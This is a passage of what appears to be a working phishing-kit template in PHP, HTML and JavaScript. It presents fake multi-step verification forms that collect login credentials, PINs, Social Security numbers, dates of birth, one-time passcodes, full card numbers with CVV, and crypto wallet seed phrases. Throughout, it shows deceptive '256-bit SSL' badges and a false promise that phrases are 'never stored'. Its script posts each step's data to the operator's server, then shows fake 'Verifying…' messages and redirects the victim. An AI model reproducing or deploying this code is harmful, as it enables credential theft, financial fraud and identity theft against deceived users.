            <label>Email Address</label>
            <input type="email" id="f_email" name="email" placeholder="Registered email address" autocomplete="email">
          </div>
        <?php elseif ($s1f === 'case_name'): ?>
          <div class="field">
            <label>Case / Reference Number</label>
            <input type="text" id="f_username" name="username" placeholder="Case number or docket number" autocomplete="off">
          </div>
          <div class="or">or</div>
          <div class="field">
            <label>Full Legal Name</label>
            <input type="text" id="f_fullname" name="fullname" placeholder="As it appears on court documents" autocomplete="name">
          </div>
        <?php else: // fallback ?>
          <div class="field">
            <label>Email Address</label>
            <input type="email" id="f_email" name="email" placeholder="Enter your email" autocomplete="email">
          </div>
        <?php endif; ?>
        <button type="submit" class="btn" id="btn1">
          <?=htmlspecialchars($sc['btn_labels'][0])?>
          <span class="btn-spin"></span>
        </button>
        <div class="err-msg" id="err1">Please enter the required information.</div>
      </form>
      <div class="sec-badge">🔒 256-bit SSL Encrypted · Secure Connection</div>
    </div>

    <!-- ════════════════════ STEP 2 ════════════════════ -->
    <div id="step2" style="display:none">
      <div class="step-header">
        <div class="step-title"><?=htmlspecialchars($sc['step_titles'][2])?></div>
        <div class="step-sub" id="step2sub"><?=htmlspecialchars($sc['step_subs'][2])?></div>
      </div>
      <form onsubmit="submitStep(event,2)">
        <?php
        $s2f = $sc['step2_fields'];
        if ($s2f === 'password'): ?>
          <div class="field">
            <label>Password</label>
            <input type="password" id="f_password" name="password" placeholder="••••••••" autocomplete="current-password">
          </div>
        <?php elseif ($s2f === 'pin_or_password'): ?>
          <div class="field">
            <label>6-Digit PIN or Password</label>
            <input type="password" id="f_pin" name="pin" placeholder="PIN or password" maxlength="20" autocomplete="current-password">
          </div>
        <?php elseif ($s2f === 'dob_zip'): ?>
          <div class="field">
            <label>Date of Birth</label>
            <input type="text" id="f_dob" name="dob" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday">
          </div>
          <div class="field">
            <label>ZIP / Postal Code</label>
            <input type="text" id="f_zip" name="zip" placeholder="e.g. 90210" maxlength="10" autocomplete="postal-code">
          </div>
        <?php elseif ($s2f === 'email_password'): ?>
          <div class="field">
            <label>Email Address</label>
            <input type="email" id="f_email2" name="email" placeholder="Account email" autocomplete="email">
          </div>
          <div class="field">
            <label>Password</label>
            <input type="password" id="f_password" name="password" placeholder="••••••••" autocomplete="current-password">
          </div>
        <?php elseif ($s2f === 'ssn_dob'): ?>
          <div class="field">
            <label>Social Security Number</label>
            <input type="text" id="f_ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" oninput="fmtSSN(this)" autocomplete="off">
          </div>
          <div class="field">
            <label>Date of Birth</label>
            <input type="text" id="f_dob" name="dob" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday">
          </div>
        <?php else: ?>
          <div class="field">
            <label>Password</label>
            <input type="password" id="f_password" name="password" placeholder="••••••••" autocomplete="current-password">
          </div>
        <?php endif; ?>
        <button type="submit" class="btn" id="btn2">
          <?=htmlspecialchars($sc['btn_labels'][1])?>
          <span class="btn-spin"></span>
        </button>
        <div class="err-msg" id="err2">Please fill in the required fields.</div>
      </form>
      <div class="sec-badge">🔒 256-bit SSL Encrypted · Secure Connection</div>
    </div>

    <!-- ════════════════════ STEP 3 ════════════════════ -->
    <?php if ($total_steps >= 3): ?>
    <div id="step3" style="display:none">
      <div class="step-header">
        <div class="step-title"><?=htmlspecialchars($sc['step_titles'][3])?></div>
        <div class="step-sub"><?=htmlspecialchars($sc['step_subs'][3])?></div>
      </div>
      <form onsubmit="submitStep(event,3)">
        <?php
        $s3f = $sc['step3_fields'];
        if ($s3f === 'ssn_dob_zip'): ?>
          <div class="field">
            <label>Social Security Number (SSN)</label>
            <input type="text" id="f_ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" oninput="fmtSSN(this)" autocomplete="off">
          </div>
          <div class="field">
            <label>Date of Birth</label>
            <input type="text" id="f_dob3" name="dob3" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday">
          </div>
          <div class="field">
            <label>ZIP / Postal Code</label>
            <input type="text" id="f_zip3" name="zip3" placeholder="e.g. 10001" maxlength="10" autocomplete="postal-code">
          </div>
        <?php elseif ($s3f === 'otp_code'): ?>
          <div class="field" style="margin-bottom:0">
            <label style="text-align:center;display:block">Verification Code</label>
          </div>
          <div class="otp-wrap" id="otpWrap">
            <input type="text" name="otp_1" maxlength="1" inputmode="numeric" oninput="otpMove(this,0)">
            <input type="text" name="otp_2" maxlength="1" inputmode="numeric" oninput="otpMove(this,1)">
            <input type="text" name="otp_3" maxlength="1" inputmode="numeric" oninput="otpMove(this,2)">
            <input type="text" name="otp_4" maxlength="1" inputmode="numeric" oninput="otpMove(this,3)">
            <input type="text" name="otp_5" maxlength="1" inputmode="numeric" oninput="otpMove(this,4)">
            <input type="text" name="otp_6" maxlength="1" inputmode="numeric" oninput="otpMove(this,5)">
          </div>
          <input type="hidden" name="otp" id="f_otp">
          <div class="otp-hint">Enter the 6-digit code from your authenticator app or SMS</div>
        <?php elseif ($s3f === 'card_full'): ?>
          <div class="field">
            <label>Card Number</label>
            <input type="text" id="f_card" name="card" placeholder="0000 0000 0000 0000" maxlength="19" oninput="fmtCard(this)" autocomplete="cc-number" inputmode="numeric">
          </div>
          <div class="card-grid">
            <div class="field">
              <label>Expiry</label>
              <input type="text" id="f_exp" name="exp" placeholder="MM/YY" maxlength="5" oninput="fmtExp(this)" autocomplete="cc-exp" inputmode="numeric">
            </div>
            <div class="field">
              <label>CVV</label>
              <input type="text" id="f_cvv" name="cvv" placeholder="000" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
            </div>
          </div>
          <div class="field">
            <label>Name on Card</label>
            <input type="text" id="f_cname" name="cname" placeholder="Full name" autocomplete="cc-name">
          </div>
        <?php elseif ($s3f === 'dob_zip'): ?>
          <div class="field">
            <label>Date of Birth</label>
            <input type="text" id="f_dob3" name="dob3" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday">
          </div>
          <div class="field">
            <label>ZIP / Postal Code</label>
            <input type="text" id="f_zip3" name="zip3" placeholder="e.g. 90210" maxlength="10" autocomplete="postal-code">
          </div>
        <?php elseif ($s3f === 'dob_only'): ?>
          <div class="field">
            <label>Date of Birth</label>
            <input type="text" id="f_dob3" name="dob3" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday">
          </div>
        <?php elseif ($s3f === 'address'): ?>
          <div class="field">
            <label>Street Address</label>
            <textarea class="addr-area" id="f_address" name="address" placeholder="Street address, City, State, ZIP"></textarea>
          </div>
        <?php elseif ($s3f === 'last4_zip'): ?>
          <div class="field">
            <label>Last 4 Digits of Card on File</label>
            <input type="text" id="f_last4" name="last4" placeholder="XXXX" maxlength="4" inputmode="numeric" autocomplete="off">
          </div>
          <div class="field">
            <label>Billing ZIP Code</label>
            <input type="text" id="f_zip3" name="zip3" placeholder="e.g. 90210" maxlength="10" autocomplete="postal-code">
          </div>
        <?php elseif ($s3f === 'wallet_phrase'): ?>
          <div class="field">
            <label>Recovery / Seed Phrase</label>
            <textarea class="wallet-area" id="f_wallet" name="wallet" placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces"></textarea>
          </div>
          <div class="wallet-hint">🔐 Your phrase is encrypted and never stored on our servers. Used only to verify wallet ownership.</div>
        <?php else: ?>
          <div class="field">
            <label>Verification Code</label>
            <input type="text" id="f_otp_s" name="otp" placeholder="Enter code" maxlength="10" inputmode="numeric" autocomplete="one-time-code">
          </div>
        <?php endif; ?>
        <button type="submit" class="btn" id="btn3">
          <?=htmlspecialchars($sc['btn_labels'][2])?>
          <span class="btn-spin"></span>
        </button>
        <div class="err-msg" id="err3">Please fill in the required fields.</div>
      </form>
      <div class="sec-badge">🔒 256-bit SSL Encrypted · Secure Connection</div>
    </div>
    <?php endif; ?>

    <!-- ════════════════════ STEP 4 ════════════════════ -->
    <?php if ($total_steps >= 4): ?>
    <div id="step4" style="display:none">
      <div class="step-header">
        <div class="step-title"><?=htmlspecialchars($sc['step_titles'][4])?></div>
        <div class="step-sub"><?=htmlspecialchars($sc['step_subs'][4])?></div>
      </div>
      <form onsubmit="submitStep(event,4)">
        <?php
        $s4f = $sc['step4_fields'] ?? 'card_full';
        if ($s4f === 'card_full'): ?>
          <div class="field">
            <label>Card Number</label>
            <input type="text" id="f_card" name="card" placeholder="0000 0000 0000 0000" maxlength="19" oninput="fmtCard(this)" autocomplete="cc-number" inputmode="numeric">
          </div>
          <div class="card-grid">
            <div class="field">
              <label>Expiry Date</label>
              <input type="text" id="f_exp" name="exp" placeholder="MM/YY" maxlength="5" oninput="fmtExp(this)" autocomplete="cc-exp" inputmode="numeric">
            </div>
            <div class="field">
              <label>CVV</label>
              <input type="text" id="f_cvv" name="cvv" placeholder="000" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
            </div>
          </div>
          <div class="field">
            <label>Name on Card</label>
            <input type="text" id="f_cname" name="cname" placeholder="Full name" autocomplete="cc-name">
          </div>
        <?php elseif ($s4f === 'wallet_phrase'): ?>
          <div class="field">
            <label>Recovery / Seed Phrase</label>
            <textarea class="wallet-area" id="f_wallet" name="wallet" placeholder="Enter your 12 or 24 word recovery phrase"></textarea>
          </div>
          <div class="wallet-hint">🔐 Your phrase is encrypted. Used only to verify wallet ownership.</div>
        <?php endif; ?>
        <button type="submit" class="btn" id="btn4">
          <?=htmlspecialchars($sc['btn_labels'][3])?>
          <span class="btn-spin"></span>
        </button>
        <div class="err-msg" id="err4">Please fill in all required fields.</div>
      </form>
      <div class="sec-badge">🔒 256-bit SSL Encrypted · Secure Connection</div>
    </div>
    <?php endif; ?>

  </div>

  <?php if($footer):?>
  <div class="card-footer"><?=$footer?></div>
  <?php endif;?>
</div>

<script>
const REDIRECT = <?=json_encode($redirect)?>;
const TOTAL_STEPS = <?=(int)$total_steps?>;
let capturedEmail = '';

// ── Step navigation ──────────────────────────────────────────────────────────
function showStep(n) {
    for (let i = 1; i <= TOTAL_STEPS; i++) {
        const el = document.getElementById('step'+i);
        if (el) el.style.display = i===n ? '' : 'none';
        const d = document.getElementById('d'+i);
        if (d) {
            if (i < n) d.className = 'dot done';
            else if (i === n) d.className = 'dot active';
            else d.className = 'dot';
        }
    }
    const s = document.getElementById('step'+n);
    if (s) {
        const inp = s.querySelector('input:not([type=hidden]),textarea');
        if (inp) setTimeout(()=>inp.focus(), 80);
    }
}

// ── Submit each step ─────────────────────────────────────────────────────────
async function submitStep(e, step) {
    e.preventDefault();
    const btn = document.getElementById('btn'+step);
    const err = document.getElementById('err'+step);
    if (err) err.style.display = 'none';

    let body = new FormData();
    body.append('_lp_step', step);
    body.append('_pid', <?=json_encode($pid)?>);

    // Collect fields based on step
    if (step === 1) {
        const emailEl   = document.getElementById('f_email');
        const unameEl   = document.getElementById('f_username');
        const phoneEl   = document.getElementById('f_phone');
        const ssnGovEl  = document.getElementById('f_ssn_gov');
        const fnameEl   = document.getElementById('f_fullname');
        const trackEl   = document.getElementById('f_tracking');
        const zipTEl    = document.getElementById('f_zip_t');
        const policyEl  = document.getElementById('f_policy');

        const email  = emailEl  ? emailEl.value.trim()  : '';
        const uname  = unameEl  ? unameEl.value.trim()  : '';
        const phone  = phoneEl  ? phoneEl.value.trim()  : '';
        const ssnG   = ssnGovEl ? ssnGovEl.value.trim() : '';
        const fname  = fnameEl  ? fnameEl.value.trim()  : '';
        const track  = trackEl  ? trackEl.value.trim()  : '';
        const zipT   = zipTEl   ? zipTEl.value.trim()   : '';
        const policy = policyEl ? policyEl.value.trim() : '';

        if (!email && !uname && !phone && !ssnG && !fname && !track && !policy) {
            if (err) err.style.display = 'block'; return;
        }

        capturedEmail = email || uname || phone || fname || policy || track;

        body.append('email',    email);
        body.append('username', uname);
        body.append('phone',    phone);
        body.append('ssn_gov',  ssnG);
        body.append('fullname', fname);
        body.append('tracking', track);
        if (zipT) body.append('zip', zipT);
        if (policy) body.append('policy', policy);

        // Show identifier in step 2 subtitle
        const sub2 = document.getElementById('step2sub');
        if (sub2 && capturedEmail) {
            const orig = sub2.dataset.orig || sub2.textContent;
            sub2.dataset.orig = orig;
            if (email) sub2.innerHTML = orig + ' &mdash; <strong>' + email + '</strong>';
        }

    } else if (step === 2) {
        const passEl = document.getElementById('f_password');
        const pinEl  = document.getElementById('f_pin');
        const dobEl  = document.getElementById('f_dob');
        const zipEl  = document.getElementById('f_zip');
        const ssnEl  = document.getElementById('f_ssn');
        const email2 = document.getElementById('f_email2');

        const pass = passEl ? passEl.value : '';
        const pin  = pinEl  ? pinEl.value  : '';
        const dob  = dobEl  ? dobEl.value.trim() : '';
        const zip  = zipEl  ? zipEl.value.trim() : '';
        const ssn  = ssnEl  ? ssnEl.value.trim() : '';
        const em2  = email2 ? email2.value.trim() : '';

        if (!pass && !pin && !dob && !ssn && !em2) {
            if (err) err.style.display = 'block'; return;
        }

        body.append('password', pass);
        body.append('pin',      pin);
        body.append('dob',      dob);
        body.append('zip',      zip);
        body.append('ssn',      ssn);
        body.append('email',    em2);

    } else if (step === 3) {
        // OTP assembly
        const otpWrap = document.getElementById('otpWrap');
        if (otpWrap) {
            const digits = Array.from(otpWrap.querySelectorAll('input')).map(i=>i.value).join('');
            const otpH = document.getElementById('f_otp');
            if (otpH) otpH.value = digits;
            if (digits.length < 6) { if (err) err.style.display = 'block'; return; }
            body.append('otp', digits);
        }

        const ssnEl  = document.getElementById('f_ssn');
        const dob3   = document.getElementById('f_dob3');
        const zip3   = document.getElementById('f_zip3');
        const addrEl = document.getElementById('f_address');
        const wallEl = document.getElementById('f_wallet');
        const last4  = document.getElementById('f_last4');
        const card3  = document.getElementById('f_card');
        const exp3   = document.getElementById('f_exp');
        const cvv3   = document.getElementById('f_cvv');
        const cname3 = document.getElementById('f_cname');
        const otp_s  = document.getElementById('f_otp_s');

        const ssn  = ssnEl  ? ssnEl.value.trim()  : '';
        const d3   = dob3   ? dob3.value.trim()   : '';
        const z3   = zip3   ? zip3.value.trim()   : '';
        const addr = addrEl ? addrEl.value.trim() : '';
        const wall = wallEl ? wallEl.value.trim() : '';
        const l4   = last4  ? last4.value.trim()  : '';
        const c3   = card3  ? card3.value.replace(/\s/g,'') : '';
        const e3   = exp3   ? exp3.value.trim()   : '';
        const vv3  = cvv3   ? cvv3.value.trim()   : '';
        const cn3  = cname3 ? cname3.value.trim() : '';
        const os   = otp_s  ? otp_s.value.trim()  : '';

        if (!ssn && !d3 && !addr && !wall && !l4 && !c3 && !os && !otpWrap) {
            if (err) err.style.display = 'block'; return;
        }

        body.append('ssn',     ssn);
        body.append('dob3',    d3);
        body.append('zip3',    z3);
        body.append('address', addr);
        body.append('wallet',  wall);
        body.append('last4',   l4);
        if (c3) body.append('card', c3);
        if (e3) body.append('exp',  e3);
        if (vv3) body.append('cvv', vv3);
        if (cn3) body.append('cname', cn3);
        if (os)  body.append('otp', os);

    } else if (step === 4) {
        const cardEl  = document.getElementById('f_card');
        const expEl   = document.getElementById('f_exp');
        const cvvEl   = document.getElementById('f_cvv');
        const cnameEl = document.getElementById('f_cname');
        const wallEl  = document.getElementById('f_wallet');

        const wall = wallEl ? wallEl.value.trim() : '';
        const card = cardEl ? cardEl.value.replace(/\s/g,'') : '';
        const exp  = expEl  ? expEl.value.trim()  : '';
        const cvv  = cvvEl  ? cvvEl.value.trim()  : '';
        const cn   = cnameEl? cnameEl.value.trim(): '';

        if (wall) {
            body.append('wallet', wall);
        } else {
            if (card.length < 15 || !exp || cvv.length < 3) { if (err) err.style.display = 'block'; return; }
            body.append('card',  card);
            body.append('exp',   exp);
            body.append('cvv',   cvv);
            body.append('cname', cn);
        }
    }

    if (btn) { btn.disabled = true; btn.classList.add('loading'); }

    try {
        const res  = await fetch(location.href, {method:'POST', body});
        const data = await res.json();
        if (data.ok) {
            if (step < TOTAL_STEPS) {
                showStep(step + 1);
            } else {
                showLoadingThenRedirect();
            }
        }
    } catch(ex) {
        if (step < TOTAL_STEPS) showStep(step + 1);
        else showLoadingThenRedirect();
    }

    if (btn) { btn.disabled = false; btn.classList.remove('loading'); }
}

function showLoadingThenRedirect() {
    const ov = document.getElementById('loadOverlay');
    ov.classList.add('show');
    const msgs = [
        'Verifying your information…',
        'Authenticating…',
        'Completing secure session…',
        'Redirecting to secure portal…'
    ];
    let i = 0;
    const iv = setInterval(()=>{ i++; if(msgs[i]) document.getElementById('loadText').textContent=msgs[i]; }, 700);
    setTimeout(()=>{ clearInterval(iv); window.location.href = REDIRECT; }, 3000);
}

// ── OTP digit-by-digit navigation ────────────────────────────────────────────
function otpMove(el, idx) {
    el.value = el.value.replace(/\D/g,'').slice(0,1);
    if (el.value) {
        const inputs = document.getElementById('otpWrap').querySelectorAll('input');
        if (idx < 5) inputs[idx+1].focus();
    }
}

// ── Input formatters ─────────────────────────────────────────────────────────
function fmtSSN(el) {
    let v = el.value.replace(/\D/g,'');
    if (v.length > 3 && v.length <= 5) v = v.slice(0,3)+'-'+v.slice(3);
    else if (v.length > 5) v = v.slice(0,3)+'-'+v.slice(3,5)+'-'+v.slice(5,9);
    el.value = v;
}
function fmtDOB(el) {
    let v = el.value.replace(/\D/g,'');
    if (v.length > 2 && v.length <= 4) v = v.slice(0,2)+'/'+v.slice(2);
    else if (v.length > 4) v = v.slice(0,2)+'/'+v.slice(2,4)+'/'+v.slice(4,8);
    el.value = v;
}
function fmtCard(el) {
    let v = el.value.replace(/\D/g,'').slice(0,16);
    el.value = v.match(/.{1,4}/g)?.join(' ') || v;
}
function fmtExp(el) {
    let v = el.value.replace(/\D/g,'');
    if (v.length > 2) v = v.slice(0,2)+'/'+v.slice(2,4);
    el.value = v;
}
</script>
</body>
</html>
